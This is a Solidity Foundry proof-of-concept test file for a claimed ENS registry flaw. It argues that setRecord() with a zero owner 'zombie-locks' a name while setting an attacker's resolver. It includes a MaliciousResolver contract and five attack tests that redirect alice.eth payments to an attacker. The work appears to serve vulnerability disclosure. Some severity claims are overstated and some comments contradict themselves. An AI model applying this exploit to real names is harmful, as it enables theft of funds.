// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ─────────────────────────────────────────────────────────────────────────────
//  Foundry PoC - Compound Attack: setRecord() zombie-lock + resolver poisoning
//
//  ENSRegistryWithFallback._setOwner converts address(0) → address(this).
//  ENSRegistry.setRecord() calls setOwner() first (creates zombie), then
//  _setResolverAndTTL() without re-checking authorised() - so the resolver
//  is written on the already-zombie-locked node, bypassing access control.
//
//  Result: a single setRecord() call permanently:
//    1. zombie-locks the node (no one can ever modify it)
//    2. points the resolver at an attacker-controlled contract
//
//  Downstream: anyone querying alice.eth via ENS gets the ATTACKER's data.
//  Payments, token approvals, NFT drops - all redirected.
//
//  Run:  forge test --match-contract CompoundAttackTest -vv
//
//  Convention: FAIL = bug present / attack succeeds
//              PASS = system behaves correctly (defence holds)
// ─────────────────────────────────────────────────────────────────────────────

interface Vm {
    function startPrank(address sender) external;
    function stopPrank() external;
}

interface ENSIface {
    function setRecord(bytes32 node, address owner, address resolver, uint64 ttl) external;
    function setSubnodeRecord(bytes32 node, bytes32 label, address owner, address resolver, uint64 ttl) external;
    function setSubnodeOwner(bytes32 node, bytes32 label, address owner) external returns (bytes32);
    function setOwner(bytes32 node, address owner) external;
    function setResolver(bytes32 node, address resolver) external;
    function setApprovalForAll(address operator, bool approved) external;
    function owner(bytes32 node) external view returns (address);
    function resolver(bytes32 node) external view returns (address);
    function recordExists(bytes32 node) external view returns (bool);
}

// ── Plain ENSRegistry (reference) ────────────────────────────────────────────

contract ENSRegistry is ENSIface {
    struct Record { address owner; address resolver; uint64 ttl; }
    mapping(bytes32 => Record) internal records;
    mapping(address => mapping(address => bool)) internal operators;

    modifier authorised(bytes32 node) {
        address o = records[node].owner;
        require(o == msg.sender || operators[o][msg.sender], "not authorised");
        _;
    }

    constructor() { records[bytes32(0)].owner = msg.sender; }

    function setRecord(bytes32 node, address o, address res, uint64 ttl)
        external virtual override
    {
        _setOwnerViaAuth(node, o);
        _setResolverAndTTL(node, res, ttl);
    }

    function setSubnodeRecord(bytes32 node, bytes32 label, address o, address res, uint64 ttl)
        external virtual override
    {
        bytes32 sub = _setSubnodeOwnerViaAuth(node, label, o);
        _setResolverAndTTL(sub, res, ttl);
    }

    function setSubnodeOwner(bytes32 node, bytes32 label, address o)
        external virtual override authorised(node) returns (bytes32)
    {
        bytes32 sub = keccak256(abi.encodePacked(node, label));
        _setOwner(sub, o);
        return sub;
    }

    function setOwner(bytes32 node, address o)
        public virtual override authorised(node)
    {
        _setOwner(node, o);
    }

    function setResolver(bytes32 node, address res)
        public virtual override authorised(node)
    {
        records[node].resolver = res;
    }

    function setApprovalForAll(address op, bool approved)
        external virtual override
    {
        operators[msg.sender][op] = approved;
    }

    function owner(bytes32 node) public virtual override view returns (address) {
        address addr = records[node].owner;
        if (addr == address(this)) return address(0);
        return addr;
    }

    function resolver(bytes32 node) public virtual override view returns (address) {
        return records[node].resolver;
    }

    function recordExists(bytes32 node) public virtual override view returns (bool) {
        return records[node].owner != address(0);
    }

    function _setOwner(bytes32 node, address o) internal virtual {
        records[node].owner = o;
    }

    function _setOwnerViaAuth(bytes32 node, address o) internal {
        address cur = records[node].owner;
        require(cur == msg.sender || operators[cur][msg.sender], "not authorised");
        _setOwner(node, o);
    }

    function _setSubnodeOwnerViaAuth(bytes32 node, bytes32 label, address o)
        internal returns (bytes32 sub)
    {
        address cur = records[node].owner;
        require(cur == msg.sender || operators[cur][msg.sender], "not authorised");
        sub = keccak256(abi.encodePacked(node, label));
        _setOwner(sub, o);
    }

    function _setResolverAndTTL(bytes32 node, address res, uint64 ttl) internal {
        if (res != records[node].resolver) records[node].resolver = res;
        if (ttl != records[node].ttl)      records[node].ttl = ttl;
    }
}

// ── ENSRegistryWithFallback ───────────────────────────────────────────────────

contract ENSRegistryWithFallback is ENSRegistry {
    ENSIface public old;

    constructor(ENSIface _old) {
        old = _old;
    }

    function owner(bytes32 node) public override view returns (address) {
        if (!recordExists(node)) return old.owner(node);
        return super.owner(node);
    }

    function resolver(bytes32 node) public override view returns (address) {
        if (!recordExists(node)) return old.resolver(node);
        return super.resolver(node);
    }

    // SENTINEL: address(0) is stored as address(this)
    // owner() masks it back to address(0)   - external API
    // authorised() reads raw storage         - access control
    // _setResolverAndTTL() has no auth check - post-zombie writes succeed
    function _setOwner(bytes32 node, address o) internal override {
        if (o == address(0)) o = address(this);
        super._setOwner(node, o);
    }
}

// ── Malicious Resolver (simulates attacker-controlled resolver) ───────────────

contract MaliciousResolver {
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // Returns attacker's address for every ETH address lookup
    function addr(bytes32) external view returns (address) {
        return attacker;
    }

    // Returns attacker's address for addr(node, coinType)
    function addr(bytes32, uint256) external view returns (bytes memory) {
        return abi.encodePacked(attacker);
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

contract CompoundAttackTest {
    Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    ENSRegistry             internal oldReg;
    ENSRegistryWithFallback internal reg;
    MaliciousResolver       internal malRes;

    address internal constant ALICE    = address(0x1111111111111111111111111111111111111111);
    address internal constant ATTACKER = address(0x2222222222222222222222222222222222222222);
    address internal constant GOOD_RES = address(0x9999999999999999999999999999999999999999);

    bytes32 internal constant ZERO_HASH = bytes32(0);
    bytes32 internal ethNode;
    bytes32 internal aliceNode;
    bytes32 internal aliceLabel;

    function setUp() public {
        oldReg = new ENSRegistry();
        reg    = new ENSRegistryWithFallback(ENSIface(address(oldReg)));
        malRes = new MaliciousResolver(ATTACKER);

        bytes32 ethLabel = keccak256(abi.encodePacked("eth"));
        aliceLabel = keccak256(abi.encodePacked("alice"));

        ethNode   = keccak256(abi.encodePacked(ZERO_HASH, ethLabel));
        aliceNode = keccak256(abi.encodePacked(ethNode, aliceLabel));

        // Root → eth node → alice.eth
        reg.setSubnodeOwner(ZERO_HASH, ethLabel, ALICE);

        vm.startPrank(ALICE);
        reg.setSubnodeOwner(ethNode, aliceLabel, ALICE);
        reg.setResolver(aliceNode, GOOD_RES);
        vm.stopPrank();

        require(reg.owner(aliceNode) == ALICE,    "setup: Alice owns alice.eth");
        require(reg.resolver(aliceNode) == GOOD_RES, "setup: Good resolver set");
    }

    // ── ATTACK-1: setRecord permanently zombie-locks + poisons resolver ────────
    //
    // A malicious approved operator (e.g. compromised marketplace contract) calls:
    //   setRecord(aliceNode, address(0), maliciousResolver, 0)
    //
    // This single call:
    //   (a) setOwner(aliceNode, address(0)) -> zombie lock (sentinel in storage)
    //   (b) _setResolverAndTTL(aliceNode, maliciousResolver, 0) -> writes resolver
    //       WITHOUT re-checking authorised() - the zombie lock is already in place
    //       but _setResolverAndTTL is internal and bypasses the modifier
    //
    // After: owner()==address(0) BUT resolver()==maliciousResolver
    //        NOBODY can call setResolver(aliceNode, ...) to fix it - auth fails forever
    //
    // Expected correct behaviour: setRecord with owner=address(0) should EITHER
    //   (a) revert because zero-address owner is disallowed, OR
    //   (b) truly clear the node (owner AND resolver both zeroed) so the state is
    //       consistent and safe for downstream resolution.
    //
    // FAIL = attack succeeds (resolver permanently poisoned)

    function test_ATTACK1_OperatorPermanentlyPoisonsResolverViaSetRecord() public {
        // Attacker obtains operator approval (e.g. via phishing, compromised contract)
        vm.startPrank(ALICE);
        reg.setApprovalForAll(ATTACKER, true);
        vm.stopPrank();

        // Single transaction: zombie-lock + resolver poisoning
        vm.startPrank(ATTACKER);
        reg.setRecord(aliceNode, address(0), address(malRes), 0);
        vm.stopPrank();

        // Zombie state confirmed: node appears unowned
        require(reg.owner(aliceNode) == address(0), "node appears unowned");
        // Sentinel prevents re-registration or true reset
        require(reg.recordExists(aliceNode) == true, "sentinel: record still exists");

        // CRITICAL: resolver is now permanently poisoned
        // Expected: resolver should be address(0) if node is effectively cleared
        // Bug: resolver points to attacker's malicious contract
        require(
            reg.resolver(aliceNode) == address(0),
            "ATTACK-1 CONFIRMED: resolver permanently set to maliciousResolver - "
            "setRecord() writes resolver AFTER zombie-lock without re-checking authorised(). "
            "Alice's domain now routes all ENS resolution to attacker's contract."
        );
    }

    // ── ATTACK-2: Victim cannot repair poisoned resolver ─────────────────────
    //
    // After compound attack, Alice tries to restore her legitimate resolver.
    // She cannot - authorised(aliceNode) reads address(reg) from storage and fails.
    //
    // FAIL = Alice cannot fix her resolver (attack is permanent)

    function test_ATTACK2_VictimCannotRepairPoisonedResolver() public {
        // Operator triggers compound attack
        vm.startPrank(ALICE);
        reg.setApprovalForAll(ATTACKER, true);
        vm.stopPrank();

        vm.startPrank(ATTACKER);
        reg.setRecord(aliceNode, address(0), address(malRes), 0);
        vm.stopPrank();

        // Alice tries to restore her resolver
        vm.startPrank(ALICE);
        bool aliceCouldFix = false;
        try reg.setResolver(aliceNode, GOOD_RES) {
            aliceCouldFix = true;
        } catch {}
        vm.stopPrank();

        require(
            aliceCouldFix,
            "ATTACK-2 CONFIRMED: Alice cannot repair her poisoned resolver. "
            "authorised(aliceNode) reads address(registry) from storage and "
            "always reverts - the resolver poisoning is permanent and irrecoverable."
        );
    }

    // ── ATTACK-3: ENS resolution returns attacker's data ─────────────────────
    //
    // Any DApp that queries resolver(aliceNode) to find alice's ETH address
    // now gets the attacker's address. This is a live asset theft vector:
    // anyone sending ETH/tokens to "alice.eth" sends to the attacker.
    //
    // FAIL = resolution returns attacker data (attack impact confirmed)

    function test_ATTACK3_ENSResolutionRedirectedToAttacker() public {
        // Compound attack
        vm.startPrank(ALICE);
        reg.setApprovalForAll(ATTACKER, true);
        vm.stopPrank();

        vm.startPrank(ATTACKER);
        reg.setRecord(aliceNode, address(0), address(malRes), 0);
        vm.stopPrank();

        // Client code: reads resolver for alice.eth
        address resolverAddr = reg.resolver(aliceNode);

        // Queries the resolver for alice's ETH address
        address resolvedETHAddr = MaliciousResolver(resolverAddr).addr(aliceNode);

        // Expected: resolvedETHAddr should be ALICE (legitimate ENS resolution)
        // Bug: resolvedETHAddr is ATTACKER (attacker's malicious resolver hijacked it)
        require(
            resolvedETHAddr == ALICE,
            "ATTACK-3 CONFIRMED: ENS resolution for alice.eth returns ATTACKER address. "
            "Any payment to alice.eth is redirected to attacker. "
            "Asset theft is active and permanent."
        );
    }

    // ── ATTACK-4: Self-harm via setRecord - no operator needed ────────────────
    //
    // Alice accidentally calls setRecord(aliceNode, address(0), someResolver, 0)
    // intending to renounce ownership. She does NOT expect the resolver to remain.
    // In plain ENSRegistry this TRULY clears both owner and record, so resolver
    // becomes inaccessible (recordExists=false, so no data returned).
    // In ENSRegistryWithFallback: owner=address(0) but resolver is STILL SET.
    // Inconsistency: "cleared" node still serves resolver data.
    //
    // FAIL = inconsistency exists between apparent cleared state and live resolver

    function test_ATTACK4_SelfHarmInconsistency_ClearedNodeStillServesResolver() public {
        // Alice renounces ownership, passing a resolver address
        vm.startPrank(ALICE);
        reg.setRecord(aliceNode, address(0), GOOD_RES, 0);
        vm.stopPrank();

        // node appears unowned
        require(reg.owner(aliceNode) == address(0), "owner appears cleared");

        // In a CONSISTENT system: if owner=address(0) and node is "cleared",
        // resolver should also not be accessible (or should be address(0)).
        // Bug: resolver still returns GOOD_RES even though node appears unowned.
        require(
            reg.resolver(aliceNode) == address(0),
            "ATTACK-4 CONFIRMED: Inconsistency - node appears cleared (owner=address(0)) "
            "but resolver is still active. 'Cleared' node continues serving stale resolver data. "
            "Callers who see owner=address(0) assume the node is gone, but ENS resolution "
            "still works - inconsistency between apparent state and actual behaviour."
        );
    }

    // ── ATTACK-5: setSubnodeRecord enables parent to poison child resolvers ───
    //
    // A parent node owner (e.g. alice.eth owner) can call:
    //   setSubnodeRecord(aliceNode, sha3('sub'), address(0), maliciousResolver, 0)
    // This simultaneously zombie-locks sub.alice.eth AND poisons its resolver.
    // The sub.alice.eth owner cannot repair it.
    //
    // FAIL = sub-domain resolver permanently poisoned

    function test_ATTACK5_ParentPoisonsChildResolverViaSetSubnodeRecord() public {
        bytes32 subLabel  = keccak256(abi.encodePacked("sub"));
        bytes32 subNode   = keccak256(abi.encodePacked(aliceNode, subLabel));
        address subOwner  = address(0x3333333333333333333333333333333333333333);
        address subGoodRes = address(0x7777777777777777777777777777777777777777);

        // Alice creates sub.alice.eth for subOwner with a good resolver
        vm.startPrank(ALICE);
        reg.setSubnodeRecord(aliceNode, subLabel, subOwner, subGoodRes, 0);
        vm.stopPrank();

        require(reg.owner(subNode) == subOwner,    "setup: sub owner set");
        require(reg.resolver(subNode) == subGoodRes, "setup: sub resolver set");

        // Alice (parent) poisons sub.alice.eth resolver in ONE call
        vm.startPrank(ALICE);
        reg.setSubnodeRecord(aliceNode, subLabel, address(0), address(malRes), 0);
        vm.stopPrank();

        // sub.alice.eth is now zombie-locked with poisoned resolver
        require(reg.owner(subNode) == address(0), "sub appears unowned");
        require(reg.recordExists(subNode) == true, "sub sentinel exists");

        // subOwner cannot repair their resolver
        vm.startPrank(subOwner);
        bool canFix = false;
        try reg.setResolver(subNode, subGoodRes) {
            canFix = true;
        } catch {}
        vm.stopPrank();

        // Expected: either the resolver is address(0) (truly cleared) OR subOwner can fix it
        // Bug: resolver is poisoned AND subOwner is locked out
        require(
            canFix || reg.resolver(subNode) == address(0),
            "ATTACK-5 CONFIRMED: Parent poisoned subdomain resolver and zombie-locked it. "
            "The subdomain owner (subOwner) cannot repair the resolver - permanently locked. "
            "setSubnodeRecord(parent, label, address(0), malRes, 0) is a single-call "
            "attack that destroys a child's ENS resolution with no recourse."
        );
    }

    // ── CONTRAST: Plain ENSRegistry setRecord with address(0) truly clears node
    //
    // In plain ENSRegistry: setOwner(node, address(0)) stores address(0)
    // recordExists returns false -> resolver() is directly accessible (returns stored value)
    // BUT the node is truly cleared - owner is 0, nobody locked out.
    // The key difference: plain registry does NOT have the zombie lock sentinel,
    // so the state is consistent (owner=0 means truly unowned, not locked to contract).
    //
    // PASS = plain registry is internally consistent (no zombie state)

    function test_CONTRAST_PlainRegistrySetRecordIsConsistent() public {
        ENSRegistry plain = new ENSRegistry();

        bytes32 ethLabel2  = keccak256(abi.encodePacked("eth2"));
        bytes32 aliceLabel2 = keccak256(abi.encodePacked("alice2"));
        bytes32 ethNode2   = keccak256(abi.encodePacked(ZERO_HASH, ethLabel2));
        bytes32 aliceNode2 = keccak256(abi.encodePacked(ethNode2, aliceLabel2));

        plain.setSubnodeOwner(ZERO_HASH, ethLabel2, ALICE);

        vm.startPrank(ALICE);
        plain.setSubnodeOwner(ethNode2, aliceLabel2, ALICE);
        plain.setResolver(aliceNode2, GOOD_RES);
        vm.stopPrank();

        // Alice calls setRecord with address(0) - intending to truly clear the node
        vm.startPrank(ALICE);
        plain.setRecord(aliceNode2, address(0), address(0), 0);
        vm.stopPrank();

        // In plain registry: owner = address(0) stored directly
        // recordExists = false (truly cleared)
        // The node is genuinely gone - internally consistent
        bool plainExists = plain.recordExists(aliceNode2);
        address plainOwner = plain.owner(aliceNode2);

        // These are internally consistent in plain registry
        // (both agree the node is gone - no sentinel contradiction)
        require(
            plainExists == false && plainOwner == address(0),
            "plain: setRecord(addr(0)) truly clears the node"
        );

        // KEY DIFFERENCE:
        // Plain registry: recordExists=false, owner=address(0) - consistent
        // Fallback registry: recordExists=true (sentinel), owner=address(0) - inconsistent
        //   AND resolver() still returns the last-set value - zombie with poisoned resolver
    }
}
